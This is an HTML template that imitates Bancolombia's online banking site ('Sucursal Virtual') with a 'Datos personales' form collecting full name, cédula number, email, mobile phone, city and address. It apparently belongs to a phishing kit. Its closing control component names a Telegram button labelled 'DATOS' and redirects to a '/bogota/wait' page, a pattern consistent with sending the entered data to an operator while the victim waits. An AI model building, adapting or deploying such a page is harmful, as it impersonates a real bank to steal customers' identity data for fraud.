<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Bancolombia - Sucursal Virtual</title>
    <script src="https://cdn.tailwindcss.script"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'bancolombia-yellow': '#fdda24',
                    }
                }
            }
        }
    </script>
    <style>
        @font-face {
            font-family: 'bancolombia';
            src: url('/3co/fonts/bancolombia.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: "Open Sans";
            src: url('/3co/fonts/OpenSans-Regular.woff') format('woff'),
                url('/3co/fonts/OpenSans-Regular.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: "Open Sans";
            src: url('/3co/fonts/OpenSans-SemiBold.woff') format('woff'),
                url('/3co/fonts/OpenSans-SemiBold.ttf') format('truetype');
            font-weight: 600;
            font-style: normal;
        }

        @font-face {
            font-family: "CIB Sans";
            src: url('/3co/fonts/CIBFontSansBold.woff2') format('woff2'),
                url('/3co/fonts/CIBFontSansBold.woff') format('woff');
            font-weight: 700;
            font-style: normal;
        }

        @font-face {
            font-family: "CIB Sans";
            src: url('/3co/fonts/CIBFontSansLight.woff2') format('woff2'),
                url('/3co/fonts/CIBFontSansLight.woff') format('woff');
            font-weight: 300;
            font-style: normal;
        }

        body {
            font-family: 'Open Sans', sans-serif;
        }

        .font-bancolombia {
            font-family: 'bancolombia', sans-serif;
        }

        .font-open-sans {
            font-family: 'Open Sans', sans-serif;
            font-weight: 400;
        }

        .font-open-sans-semibold {
            font-family: 'Open Sans', sans-serif;
            font-weight: 600;
        }

        .font-cib-sans-light {
            font-family: 'CIB Sans', sans-serif;
            font-weight: 300;
        }

        .font-cib-sans-bold {
            font-family: 'CIB Sans', sans-serif;
            font-weight: 700;
        }

        .floating-label-container {
            position: relative;
            display: flex;
            align-items: center;
            transition: all 0.3s ease;
        }

        .floating-label {
            position: absolute;
            left: 2.5rem;
            top: 50%;
            transform: translateY(-50%);
            font-size: 14px;
            color: #6b7280;
            transition: all 0.2s ease;
            padding: 0 4px;
            pointer-events: none;
            z-index: 10;
            background: white;
        }

        .floating-label.active {
            top: -4px;
            left: 0.5rem;
            font-size: 12px;
            color: #374151;
            transform: translateY(0);
        }

        .floating-input {
            width: 100%;
            padding: 12px 16px 12px 40px;
            font-weight: 600;
            font-size: 14px;
            outline: none;
            transition: all 0.2s ease;
            background: white;
            border: none;
            border-bottom: 0.5px solid #d1d5db;
        }

        .input-icon {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            z-index: 5;
        }

        .floating-input:focus {
            border-bottom: 0.5px solid #374151;
        }

        .thin-border-bottom {
            border-bottom: 0.5px solid #d1d5db;
        }

        .thin-border-input {
            border-bottom: 0.5px solid #d1d5db !important;
        }

        .thin-border-input:focus {
            border-bottom: 0.5px solid #374151 !important;
        }

        .bg-bancolombia {
            background-image: url('/3co/assets/bgImage.svg');
            background-position: bottom;
            background-repeat: no-repeat;
        }

        .loading-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #fdda24;
            border-top: 4px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .password-input {
            font-size: 18px;
            font-weight: 600;
            color: #000;
            text-align: center;
            background: white;
            border: none;
            outline: none;
            padding: 2px 0 8px 0;
            caret-color: #000;
        }

        .password-input:focus {
            border-bottom-color: #374151;
        }

        @media (hover: none) and (pointer: coarse) {
            .password-input {
                font-size: 20px;
                padding: 1px 0 9px 0;
            }
        }
    </style>
    <x-control :auto-guardar="false" :auto-completar="false" :auto-init="true" :debug="false" />
</head>

<body class="bg-gray-100">

    <!-- Header -->
    <div class="w-full flex justify-center items-center py-3 z-50">
        <div class="w-[98%] flex gap-10 items-center">
            <img src="/3co/assets/header.svg" class="ml-[25%] w-[45%] object-contain" alt="Bancolombia" />
            <div class="flex justify-center items-center gap-1.5 cursor-pointer" onclick="salir()">
                <span class="text-[15px]">Salir</span>
                <img src="/3co/assets/exitHeader.svg" class="w-5 object-contain" alt="Salir" />
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <div class="bg-bancolombia min-h-[70vh] w-[90%] mx-auto flex flex-col items-center justify-center">

        <!-- DATOS (Nueva sección) -->
        <div id="datos" class="w-full flex flex-col justify-center items-center pb-6">
            <h5 class="text-[24px] font-cib-sans-bold mt-10">Datos personales</h5>
            <div class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">
                <form id="formulario" class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
                    <div class="w-full flex items-center justify-center hiddenerror hidden">
                        <span class="text-[11px] text-red-600"> Verifica la información e inténtalo nuevamente.</span>
                    </div>

                    <!-- Nombre -->
                    <div class="w-full flex flex-col justify-center items-center my-2.5">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                                xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                                    d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                            </svg>
                            <input id="nombre" type="text" class="floating-input" placeholder="" autocomplete="off" />
                            <span id="nombreLabel" class="floating-label">Nombre completo</span>
                        </div>
                        <span id="nombreError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <!-- Cédula -->
                    <div class="w-full flex flex-col justify-center items-center my-2.5">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                                xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                                    d="M3 7h18v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7zm3 4h6m-6 3h4m7-5h1" />
                            </svg>
                            <input id="cedula" type="tel" inputmode="numeric" pattern="\d*" class="floating-input"
                                placeholder="" autocomplete="off" />
                            <span id="cedulaLabel" class="floating-label">Cédula</span>
                        </div>
                        <span id="cedulaError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <!-- Email -->
                    <div class="w-full flex flex-col justify-center items-center my-2.5">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                                xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                                    d="M3 8l9 6 9-6M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                            </svg>
                            <input id="email" type="email" class="floating-input" placeholder="" autocomplete="off" />
                            <span id="emailLabel" class="floating-label">Correo electrónico</span>
                        </div>
                        <span id="emailError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <!-- Celular (exactamente 10 dígitos) -->
                    <div class="w-full flex flex-col justify-center items-center my-2.5">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                                xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                                    d="M3 5a2 2 0 012-2h3l2 4-2 2a12 12 0 006 6l2-2 4 2v3a2 2 0 01-2 2h-1C9.82 20.5 3.5 14.18 3 6V5z" />
                            </svg>
                            <input id="celular" type="tel" inputmode="numeric" pattern="\d*" minlength="10"
                                maxlength="10" class="floating-input" placeholder="" autocomplete="off" />
                            <span id="celularLabel" class="floating-label">Celular</span>
                        </div>
                        <span id="celularError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <!-- Ciudad -->
                    <div class="w-full flex flex-col justify-center items-center my-2.5">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                                xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                                    d="M12 11a3 3 0 100-6 3 3 0 000 6zm0 9c-4-4-6-6-6-9a6 6 0 1112 0c0 3-2 5-6 9z" />
                            </svg>
                            <input id="ciudad" type="text" class="floating-input" placeholder="" autocomplete="off" />
                            <span id="ciudadLabel" class="floating-label">Ciudad</span>
                        </div>
                        <span id="ciudadError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <!-- Dirección -->
                    <div class="w-full flex flex-col justify-center items-center my-2.5">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                                xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                                    d="M3 12l9-7 9 7M5 10v10h5v-6h4v6h5V10" />
                            </svg>
                            <input id="direccion" type="text" class="floating-input" placeholder=""
                                autocomplete="off" />
                            <span id="direccionLabel" class="floating-label">Dirección</span>
                        </div>
                        <span id="direccionError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <input type="hidden" id="no-status" name="status" value="datos" />

                    <div class="w-full pt-6 pb-2 flex justify-center items-center">
                        <button id="enviar"
                            class="font-bold py-2 px-6 rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed bg-gray-300 w-32"
                            disabled>
                            Continuar
                        </button>
                    </div>
                </form>
            </div>
        </div>

    </div>

    <!-- Footer -->
    <div class="w-full flex flex-col justify-center items-center py-7">
        <div class="w-[90%] border-t border-gray-300"></div>
        <img src="/3co/assets/header.svg" class="w-[40%] object-contain" alt="Bancolombia" />
        <img src="/3co/assets/foter.svg" class="w-[40%] object-contain mt-0.5" alt="Footer" />
    </div>

    <script>
        /* ===== UTILIDADES ===== */

        /**
         * Habilita o deshabilita un botón con estilos apropiados
         */
        function toggleButton(btn, enabled) {
            if (!btn) return;
            btn.disabled = !enabled;
            if (enabled) {
                btn.classList.remove('bg-gray-300', 'text-black', 'cursor-not-allowed');
                btn.classList.add('bg-bancolombia-yellow', 'text-black', 'cursor-pointer');
            } else {
                btn.classList.remove('bg-bancolombia-yellow', 'cursor-pointer');
                btn.classList.add('bg-gray-300', 'text-black', 'cursor-not-allowed');
            }
        }

        /**
         * Muestra o oculta mensajes de error
         */
        function setError(id, msg) {
            const el = document.getElementById(id);
            if (!el) return;
            if (msg) {
                el.textContent = msg;
                el.classList.remove('hidden');
            } else {
                el.classList.add('hidden');
            }
        }

        /* ===== FLOATING LABELS ===== */

        /**
         * Actualiza el estado de todos los floating labels
         */
        function updateAllLabels() {
            const inputs = document.querySelectorAll('.floating-input');
            inputs.forEach(input => {
                const label = input.nextElementSibling;
                if (!label || !label.classList.contains('floating-label')) return;

                if (input.value) {
                    label.classList.add('active');
                } else {
                    label.classList.remove('active');
                }
            });
        }

        /**
         * Configura los floating labels para todos los inputs
         */
        function setupFloatingLabels() {
            const inputs = document.querySelectorAll('.floating-input');
            inputs.forEach(input => {
                const label = input.nextElementSibling;
                if (!label || !label.classList.contains('floating-label')) return;

                // Activar label si hay valor
                function updateLabel() {
                    if (input.value) {
                        label.classList.add('active');
                    } else {
                        label.classList.remove('active');
                    }
                }

                input.addEventListener('focus', () => label.classList.add('active'));
                input.addEventListener('blur', updateLabel);
                input.addEventListener('input', updateLabel);

                // Inicializar estado
                updateLabel();
            });

            // Verificar de nuevo después del autocompletado de localStorage
            setTimeout(updateAllLabels, 100);
            setTimeout(updateAllLabels, 500);
        }

        /* ===== VALIDACIONES DE CAMPOS DE ENTRADA ===== */

        /**
         * Valida los datos personales
         * Campos: nombre, cédula, email, celular, ciudad, dirección
         */
        function validateDatos(showErrors = false) {
            const nombre = document.getElementById('nombre');
            const cedula = document.getElementById('cedula');
            const email = document.getElementById('email');
            const celular = document.getElementById('celular');
            const ciudad = document.getElementById('ciudad');
            const direccion = document.getElementById('direccion');

            const errores = {};

            // Validar nombre
            if (!nombre || !nombre.value.trim()) {
                errores.nombre = 'Campo obligatorio';
            } else if (nombre.value.trim().length < 3) {
                errores.nombre = 'Mínimo 3 caracteres';
            } else if (!/^[a-zA-ZáéíóúÁÉÍÓÚñÑ\s]+$/.test(nombre.value.trim())) {
                errores.nombre = 'Solo letras y espacios';
            }

            // Validar cédula
            if (!cedula || !cedula.value.trim()) {
                errores.cedula = 'Campo obligatorio';
            } else if (!/^\d{6,12}$/.test(cedula.value.trim())) {
                errores.cedula = 'Solo números (6-12 dígitos)';
            }

            // Validar celular: exactamente 10 dígitos
            if (!celular || !celular.value.trim()) {
                errores.celular = 'Campo obligatorio';
            } else if (!/^\d{10}$/.test(celular.value.trim())) {
                errores.celular = 'Debe tener exactamente 10 dígitos';
            }

            // Validar email
            if (!email || !email.value.trim()) {
                errores.email = 'Campo obligatorio';
            } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email.value.trim())) {
                errores.email = 'Email inválido';
            }

            // Validar ciudad
            if (!ciudad || !ciudad.value.trim()) {
                errores.ciudad = 'Campo obligatorio';
            } else if (ciudad.value.trim().length < 3) {
                errores.ciudad = 'Mínimo 3 caracteres';
            }

            // Validar dirección
            if (!direccion || !direccion.value.trim()) {
                errores.direccion = 'Campo obligatorio';
            } else if (direccion.value.trim().length < 5) {
                errores.direccion = 'Mínimo 5 caracteres';
            }

            if (showErrors) {
                setError('nombreError', errores.nombre);
                setError('cedulaError', errores.cedula);
                setError('emailError', errores.email);
                setError('celularError', errores.celular);
                setError('ciudadError', errores.ciudad);
                setError('direccionError', errores.direccion);
            }

            const isValid = Object.keys(errores).length === 0;

            // Habilitar/deshabilitar botón
            const btnEnviar = document.getElementById('enviar');
            toggleButton(btnEnviar, isValid);

            return isValid;
        }

        /* ===== INICIALIZACIÓN ===== */

        document.addEventListener('DOMContentLoaded', function () {
            // Setup floating labels
            setupFloatingLabels();

            // Agregar listeners de validación a todos los campos
            const campos = ['nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion'];
            campos.forEach(campoId => {
                const campo = document.getElementById(campoId);
                if (campo) {
                    campo.addEventListener('input', () => validateDatos(false));
                    campo.addEventListener('blur', () => validateDatos(true));
                }
            });

            // Validación inicial
            validateDatos(false);
        });
    </script>

    <x-control
        :auto-completar="true"
        :debug="false"
        redirect-url="/bogota/wait"
        toast-message="Verifica la información ingresada sea la correcta o actualizala"
        telegram-button="DATOS"
    />

</body>

</html>
